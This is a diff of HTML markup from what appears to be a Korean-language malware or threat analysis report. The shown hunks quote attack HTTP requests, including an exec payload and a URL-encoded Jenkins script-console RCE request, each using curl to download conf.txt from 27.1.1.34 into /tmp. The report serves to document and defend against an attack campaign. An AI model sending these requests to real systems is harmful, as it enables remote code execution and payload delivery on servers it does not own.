@@ -247,16 +247,12 @@
 <pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/{VULN_URI}</span> HTTP/1.1
 <span class="hljs-attribute">Host</span>: {target}:{port}
 
-{...exec(\&quot;curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\&quot;)...}</code></pre>
-</li>
-</ol>
-<ol>
+{...exec(\&quot;curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\&quot;)...}</code></pre></li>
 <li><p>Jenkins script console RCE</p>
 <pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/{VULN_URI}</span> HTTP/1.1
 <span class="hljs-attribute">Host</span>: {target}:{port}
 
-curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%22.execute%28%29.text&amp;json=%7B%22script%22%3A+%22println+%5C%22curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&amp;Submit=Run</code></pre>
-</li>
+curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%22.execute%28%29.text&amp;json=%7B%22script%22%3A+%22println+%5C%22curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&amp;Submit=Run</code></pre></li>
 </ol>
 <p>&#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xB41C; <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <ol>
